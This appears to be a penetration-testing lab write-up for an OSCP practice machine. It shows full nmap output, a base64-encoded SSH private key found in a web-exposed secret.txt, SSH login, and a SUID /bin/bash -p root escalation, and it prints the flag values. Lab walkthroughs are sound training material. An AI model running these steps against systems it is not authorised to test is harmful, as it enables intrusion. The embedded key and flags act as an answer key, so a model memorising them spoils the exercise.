## Given

- ip: 192.168.119.89
- user on the box is “oscp” - taken from reading the site content

## Steps

### Foothold

- nmap
    - open ports: tcp 22,80,33060
    - wordpress site (5.4.2)
    - apache server on ubuntu - 2.4.41
    - unrecognized service on 33060 - possibly sqlx?
- checked robots.txt and secrets.txt
    - Found base64 encoded hash in secrets.txt
    - decode it to get private key for using ssh
    - save to file, and give the file read/write access for only the current user
        - `chmod 600 id_rsa`
- use ssh to login as oscp
    - `ssh oscp@192.168.119.89 -i id_rsa`
- check `whoami, pwd, ll` and other scripts when you get onto the machine
- local file should be in user’s home folder

### PrivEsc

- `sudo -l` asks for a password, and in the real world the admin would have been notified
- Try `find / -perm -u=s -type f 2>/dev/null` to find all files with the super user id bit in them
- Notice that `/bin/bash` is on the list
- `/bin/bash -p` gets us a root shell

## Findings

1. Nmap scan

```bash
# Nmap 7.94SVN scan initiated Tue Jun  3 11:15:16 2025 as: nmap -sCV -T4 -p- --open -oN nmap.out 192.168.119.89
Nmap scan report for 192.168.119.89
Host is up (0.0100s latency).
Not shown: 65270 closed tcp ports (reset), 262 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)
|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)
|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/secret.txt
|_http-title: OSCP Voucher &#8211; Just another WordPress site
|_http-generator: WordPress 5.4.2
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <https://nmap.org/cgi-bin/submit.cgi?new-service> :
SF-Port33060-TCP:V=7.94SVN%I=7%D=6/3%Time=683E68D3%P=x86_64-pc-linux-gnu%r
SF:(NULL,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(GenericLines,9,"\\x05\\0\\0\\0\\x0
SF:b\\x08\\x05\\x1a\\0")%r(GetRequest,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(HTTP
SF:Options,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(RTSPRequest,9,"\\x05\\0\\0\\0\\x
SF:0b\\x08\\x05\\x1a\\0")%r(RPCCheck,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(DNSVe
SF:rsionBindReqTCP,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(DNSStatusRequestTCP
SF:,2B,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0
SF:fInvalid\\x20message\\"\\x05HY000")%r(Help,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0
SF:")%r(SSLSessionReq,2B,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x
SF:01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\"\\x05HY000")%r(TerminalServerCook
SF:ie,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(TLSSessionReq,2B,"\\x05\\0\\0\\0\\x0b
SF:\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message
SF:\\"\\x05HY000")%r(Kerberos,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(SMBProgNeg
SF:,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(X11Probe,2B,"\\x05\\0\\0\\0\\x0b\\x08\\x0
SF:5\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\"\\x05H
SF:Y000")%r(FourOhFourRequest,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(LPDStrin
SF:g,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(LDAPSearchReq,2B,"\\x05\\0\\0\\0\\x0b\\
SF:x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\
SF:"\\x05HY000")%r(LDAPBindReq,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(SIPOptio
SF:ns,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(LANDesk-RC,9,"\\x05\\0\\0\\0\\x0b\\x08
SF:\\x05\\x1a\\0")%r(TerminalServer,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(NCP,9
SF:,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(NotesRPC,2B,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\
SF:x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\"\\x05HY0
SF:00")%r(JavaRMI,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(WMSRequest,9,"\\x05\\0
SF:\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(oracle-tns,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")
SF:%r(ms-sql-s,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0")%r(afp,2B,"\\x05\\0\\0\\0\\x0b\\
SF:x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\
SF:"\\x05HY000")%r(giop,9,"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
# Nmap done at Tue Jun  3 11:15:47 2025 -- 1 IP address (1 host up) scanned in 30.97 seconds
```

1. secrets.txt

```
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB
QUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFB
d0VBQVFBQUFZRUF0SENzU3pIdFVGOEs4dGlPcUVDUVlMcktLckNSc2J2cTZpSUc3UjlnMFdQdjl3
K2drVVdlCkl6QlNjdmdsTEU5ZmxvbHNLZHhmTVFRYk1WR3FTQURuWUJUYXZhaWdRZWt1ZTBiTHNZ
ay9yWjVGaE9VUlpMVHZkbEpXeHoKYklleUM1YTVGMERsOVVZbXpDaGU0M3owRG8waVF3MTc4R0pV
UWFxc2NMbUVhdHFJaVQvMkZrRitBdmVXM2hxUGZicnc5dgpBOVFBSVVBM2xlZHFyOFhFelkvL0xx
MCtzUWcvcFV1MEtQa1kxOGk2dm5maVlIR2t5VzFTZ3J5UGg1eDlCR1RrM2VSWWNOCnc2bURiQWpY
S0tDSEdNK2RubkdOZ3ZBa3FUK2daV3ovTXB5MGVrYXVrNk5QN05Dek9STnJJWEFZRmExcld6YUV0
eXBId1kKa0NFY2ZXSkpsWjcrZmNFRmE1QjdnRXd0L2FLZEZSWFBRd2luRmxpUU1ZTW1hdThQWmJQ
aUJJcnh0SVlYeTNNSGNLQklzSgowSFNLditIYktXOWtwVEw1T29Ba0I4ZkhGMzB1alZPYjZZVHVj
MXNKS1dSSElaWTNxZTA4STJSWGVFeEZGWXU5b0x1ZzBkCnRIWWRKSEZMN2NXaU52NG1SeUo5UmNy
aFZMMVYzQ2F6TlpLS3dyYVJBQUFGZ0g5SlFMMS9TVUM5QUFBQUIzTnphQzF5YzIKRUFBQUdCQUxS
d3JFc3g3VkJmQ3ZMWWpxaEFrR0M2eWlxd2tiRzc2dW9pQnUwZllORmo3L2NQb0pGRm5pTXdVbkw0
SlN4UApYNWFKYkNuY1h6RUVHekZScWtnQTUyQVUycjJvb0VIcExudEd5N0dKUDYyZVJZVGxFV1Mw
NzNaU1ZzYzJ5SHNndVd1UmRBCjVmVkdKc3dvWHVOODlBNk5Ja01OZS9CaVZFR3FySEM1aEdyYWlJ
ay85aFpCZmdMM2x0NGFqMzI2OFBid1BVQUNGQU41WG4KYXEvRnhNMlAveTZ0UHJFSVA2Vkx0Q2o1
R05mSXVyNTM0bUJ4cE1sdFVvSzhqNGVjZlFSazVOM2tXSERjT3BnMndJMXlpZwpoeGpQblo1eGpZ
THdKS2svb0dWcy96S2N0SHBHcnBPalQrelFzemtUYXlGd0dCV3RhMXMyaExjcVI4R0pBaEhIMWlT
WldlCi9uM0JCV3VRZTRCTUxmMmluUlVWejBNSXB4WllrREdESm1ydkQyV3o0Z1NLOGJTR0Y4dHpC
M0NnU0xDZEIwaXIvaDJ5bHYKWktVeStUcUFKQWZIeHhkOUxvMVRtK21FN25OYkNTbGtSeUdXTjZu
dFBDTmtWM2hNUlJXTHZhQzdvTkhiUjJIU1J4UyszRgpvamIrSmtjaWZVWEs0VlM5VmR3bXN6V1Np
c0sya1FBQUFBTUJBQUVBQUFHQkFMQ3l6ZVp0SkFwYXFHd2I2Y2VXUWt5WFhyCmJqWmlsNDdwa05i
VjcwSldtbnhpeFkzMUtqckRLbGRYZ2t6TEpSb0RmWXAxVnUrc0VUVmxXN3RWY0JtNU1abVFPMWlB
cEQKZ1VNemx2RnFpRE5MRktVSmRUajdmcXlPQVhEZ2t2OFFrc05tRXhLb0JBakduTTl1OHJSQXlq
NVBObzF3QVdLcENMeElZMwpCaGRsbmVOYUFYRFYvY0tHRnZXMWFPTWxHQ2VhSjBEeFNBd0c1Snlz
NEtpNmtKNUVrZldvOGVsc1VXRjMwd1FrVzl5aklQClVGNUZxNnVkSlBubUVXQXB2THQ2MkllVHZG
cWcrdFB0R25WUGxlTzNsdm5DQkJJeGY4dkJrOFd0b0pWSmRKdDNoTzhjNGoKa010WHN2TGdSbHZl
MWJaVVpYNU15bUhhbE4vTEExSXNvQzRZa2cvcE1nM3M5Y1lSUmttK0d4aVVVNWJ2OWV6d000Qm1r
bwpRUHZ5VWN5ZTI4endrTzZ0Z1ZNWng0b3NySW9OOVd0RFVVZGJkbUQyVUJaMm4zQ1pNa09WOVhK
eGVqdTUxa0gxZnM4cTM5ClFYZnhkTmhCYjNZcjJSakNGVUxEeGh3RFNJSHpHN2dmSkVEYVdZY09r
TmtJYUhIZ2FWN2t4enlwWWNxTHJzMFM3QzRRQUEKQU1FQWhkbUQ3UXU1dHJ0QkYzbWdmY2RxcFpP
cTYrdFc2aGttUjBoWk5YNVo2Zm5lZFV4Ly9RWTVzd0tBRXZnTkNLSzhTbQppRlhsWWZnSDZLLzVV
blpuZ0Viak1RTVRkT09sa2JyZ3BNWWloK1pneXZLMUxvT1R5TXZWZ1Q1TE1nakpHc2FRNTM5M00y
CnlVRWlTWGVyN3E5ME42VkhZWERKaFVXWDJWM1FNY0NxcHRTQ1MxYlNxdmttTnZoUVhNQWFBUzhB
SncxOXFYV1hpbTE1U3AKV29xZGpvU1dFSnhLZUZUd1VXN1dPaVlDMkZ2NWRzM2NZT1I4Um9yYm1H
bnpkaVpneFpBQUFBd1FEaE5YS21TMG9WTWREeQozZktaZ1R1d3I4TXk1SHlsNWpyYTZvd2ovNXJK
TVVYNnNqWkVpZ1phOTZFamNldlpKeUdURjJ1Vjc3QVEyUnF3bmJiMkdsCmpkTGtjMFl0OXVicVNp
a2Q1ZjhBa1psWkJzQ0lydnVEUVpDb3haQkd1RDJEVVd6T2dLTWxmeHZGQk5RRitMV0ZndGJyU1AK
T2dCNGloZFBDMSs2RmRTalFKNzdmMWJOR0htbjBhbW9pdUpqbFVPT1BMMWNJUHp0MGh6RVJMajJx
djlEVWVsVE9VcmFuTwpjVVdyUGdyelZHVCtRdmtrakdKRlgrcjh0R1dDQU9RUlVBQUFEQkFNMGNS
aERvd09GeDUwSGtFK0hNSUoyalFJZWZ2d3BtCkJuMkZONmt3NEdMWmlWY3FVVDZhWTY4bmpMaWh0
RHBlZVN6b3BTanlLaDEwYk53UlMwREFJTHNjV2c2eGMvUjh5dWVBZUkKUmN3ODV1ZGtoTlZXcGVy
ZzRPc2lGWk1wd0txY01sdDhpNmxWbW9VQmpSdEJENGc1TVlXUkFOTzBOajlWV01UYlc5UkxpUgpr
dW9SaVNoaDZ1Q2pHQ0NIL1dmd0NvZjllbkNlajRIRWo1RVBqOG5aMGNNTnZvQVJxN1ZuQ05HVFBh
bWNYQnJmSXd4Y1ZUCjhuZksyb0RjNkxmckRtalFBQUFBbHZjMk53UUc5elkzQT0KLS0tLS1FTkQg
T1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==
```

## Creds

- oscp / private key

## Flags

- local: 9516e2ce9597071a66b7b6ee8bad9855
- admin: c9b956b76ce949050ab8fd918311d616

### Proof

![](Pasted%20image%2020250607211246.png)